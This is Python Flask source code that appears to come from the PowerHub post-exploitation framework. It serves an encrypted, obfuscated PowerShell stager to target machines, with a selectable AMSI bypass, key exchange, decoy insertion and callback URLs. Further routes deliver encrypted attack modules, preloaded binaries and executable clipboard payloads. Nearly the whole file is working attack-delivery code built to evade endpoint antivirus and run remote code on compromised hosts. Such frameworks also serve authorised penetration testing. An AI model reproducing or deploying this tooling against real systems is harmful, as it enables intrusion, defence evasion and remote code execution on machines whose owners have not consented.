from base64 import b64encode
import logging
import os
import random
import string

from flask import render_template, request, Response, Flask

from powerhub.tools import encrypt_rc4, encrypt_aes, compress
import powerhub.modules as phmod
from powerhub.stager import get_stage, insert_decoys
from powerhub.directories import directories
from powerhub.dhkex import DH_G, DH_MODULUS, DH_ENDPOINT
from powerhub.parameters import param_collection
from powerhub import __version__

hidden_app = Flask(
    'hidden_app',
    template_folder=os.path.join(directories.BASE_DIR, 'templates'),
)
hidden_app.config['TEMPLATES_AUTO_RELOAD'] = True

log = logging.getLogger(__name__)


@hidden_app.add_template_filter
def debug(msg):
    """This is a function for debugging statements in jinja2 templates"""
    if log.getEffectiveLevel() == logging.DEBUG:
        return msg
    return ""


@hidden_app.add_template_filter
def rc4encrypt(msg):
    """This is a function for encrypting strings in jinja2 templates"""
    return b64encode(encrypt_rc4(msg.encode(), hidden_app.key)).decode()


def get_stage3():
    minimal = param_collection['minimal']
    transport = param_collection['transport']
    slow_encryption = param_collection['slowenc']
    preloaded_modules = param_collection['preloaded']
    preloaded_modules_content = get_preloaded_modules_content(preloaded_modules)
    preloaded_modules = get_preloaded_modules(preloaded_modules)

    if hidden_app.args.WEBDAV_AUTH:
        webdav_user, webdav_pass = hidden_app.args.WEBDAV_AUTH.split(':')
    else:
        webdav_user, webdav_pass = '', ''

    powerhub_context = dict(
        modules=phmod.modules,
        preloaded_modules=preloaded_modules,
        preloaded_modules_content=preloaded_modules_content,
        callback_url=hidden_app.callback_urls[transport],
        transport=transport,
        webdav_url=hidden_app.webdav_url,
        webdav_user=webdav_user,
        webdav_pass=webdav_pass,
        key=hidden_app.key,
        VERSION=__version__,
        minimal=minimal,
        slow_encryption=slow_encryption,
    )

    stage3 = render_template(
        "powershell/powerhub.ps1",
        **powerhub_context,
    )

    return stage3


def get_profile():
    try:
        with open(os.path.join(directories.XDG_DATA_HOME, "profile.ps1"), "r") as f:
            profile = f.read()
    except Exception as e:
        log.error("Error while reading profile.ps1: %s" % str(e))
        profile = ""

    return profile


def get_clipboard_entry():
    try:
        clipboard_id = int(param_collection['clip-exec'])
        if clipboard_id < 0:
            return ""

        clipboard_entry = hidden_app.clipboard.entries[clipboard_id]
        if clipboard_entry.executable:
            clipboard_entry = clipboard_entry.content
        else:
            log.error(
                "Cannot include clipboard entry %d, "
                "because the executable flag is not set"
            )
            clipboard_entry = ""
    except (TypeError, IndexError):
        clipboard_entry = ""

    return clipboard_entry


@hidden_app.route('/')
def stager():
    """Load the stager"""
    log.debug("Building stage 1; arguments: %s" % dict(request.args))

    stage3 = get_stage3()
    profile = get_profile()
    clipboard_entry = get_clipboard_entry()

    param_collection.parse_get_args_short(request.args)
    amsi_bypass = param_collection['amsi']
    amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')

    key = hidden_app.key

    kex = param_collection['kex']
    natural = param_collection['natural']
    transport = param_collection['transport']
    slow_encryption = param_collection['slowenc']
    decoy = param_collection['decoy']
    obfuscate_setalias = param_collection['obfuscate_setalias']
    increment = request.args.get('increment')

    if increment or decoy:
        separator = '<#%s#>' % ''.join(random.choices(string.ascii_letters, k=32))
    else:
        separator = ''

    stager_context = dict(
        key=key,
        amsibypass=amsi_bypass,
        callback=hidden_app.callback_urls[transport],
        kex=kex,
        DH_G=DH_G,
        DH_MODULUS=DH_MODULUS,
        dh_endpoint=DH_ENDPOINT,
        separator=separator,
        slow_encryption=slow_encryption,
        obfuscate_setalias=obfuscate_setalias,
    )

    result = get_stage(
        key,
        stage3_strings=[stage3, profile, clipboard_entry],
        context=stager_context,
        debug=(log.getEffectiveLevel() <= logging.DEBUG),
        natural=natural,
        remove_whitespace=(not decoy),
    )

    if decoy:
        result = insert_decoys(result, separator)

    if increment:
        result = result.split(separator)[int(increment)]
    else:
        result = result.replace(separator, '')

    log.debug("Delivering stage 1; context: %s" % stager_context)

    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/list')
def hub_modules():
    """Return list of hub modules"""

    context = {
        "modules": phmod.modules,
    }

    result = render_template(
        "powershell/modules.csv",
        **context,
    )

    if 's' in request.args:
        # Slow encryption
        encrypt = encrypt_rc4
    else:
        encrypt = encrypt_aes

    result = encrypt(result, hidden_app.key)

    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/module')
def load_module():
    """Load a single module"""

    if 'm' not in request.args:
        return Response('error')

    try:
        n = int(request.args.get('m'))
        code = phmod.modules[n].code
    except (IndexError, ValueError):
        return Response("not found")

    if 's' in request.args:
        # Slow encryption
        encrypt = encrypt_rc4
    else:
        encrypt = encrypt_aes

    if 'c' in request.args:
        code = compress(code)

    encrypted = encrypt(code, hidden_app.key)
    resp = b64encode(encrypted)

    return Response(
        resp,
        content_type='text/plain; charset=utf-8'
    )


def get_preloaded_modules(csvlist):
    """Return a string that will be inserted into a PowerShell array

    The format of each line is this:
        New-Object PSObject -Property @{ Name="<NAME">, ... }
    """

    if not csvlist:
        return ""

    try:
        csvlist = expand_csv(csvlist)
    except Exception:
        log.error("Couldn't parse CSV list: %s" % csvlist)
        return ""

    result = "\n"

    for i in csvlist:
        try:
            m = phmod.modules[i]
        except IndexError:
            log.error("Module not found: %s" % i)
            continue

        obj = '@{ Name="%s"; Type="%s"; N=%d; Loaded=$True; Alias="" }' % (
            m.name, m.type, m.n,
        )
        result += 'New-Object PowerHubModule -Property %s \n' % obj

    return result


def get_preloaded_modules_content(csvlist):
    """Return a string that will be inserted into a PowerShell hashtable

    The format of each line is this:
        <module name> = @"<powershell string>"@
    or for binary modules:
        <module name> = [System.Convert]::FromBase64String("<b64 string>")
    """

    if not csvlist:
        return ""

    try:
        csvlist = expand_csv(csvlist)
    except Exception:
        log.error("Couldn't parse CSV list: %s" % csvlist)
        return ""

    result = "\n"

    for i in csvlist:
        try:
            m = phmod.modules[i]
        except IndexError:
            log.error("Module not found: %s" % i)
            continue
        name = m.name
        code = m.code

        if isinstance(m.code, bytes):
            code = b64encode(code).decode()
            code = '[System.Convert]::FromBase64String("%s")' % code
        else:
            code = '@"%s"@)' % code

        result += "'%s' = %s\n" % (name, code)

    return result


def expand_csv(csvlist):
    """Turn compactified CSV list into string of ints

    Example: 1,2,5-8,12,14-16
    """

    csvlist = csvlist.split(',')
    result = []
    for item in csvlist:
        if '-' in item:
            a, b = item.split('-')
            result.extend(range(int(a), int(b)+1))
        else:
            result.append(int(item))
    return result
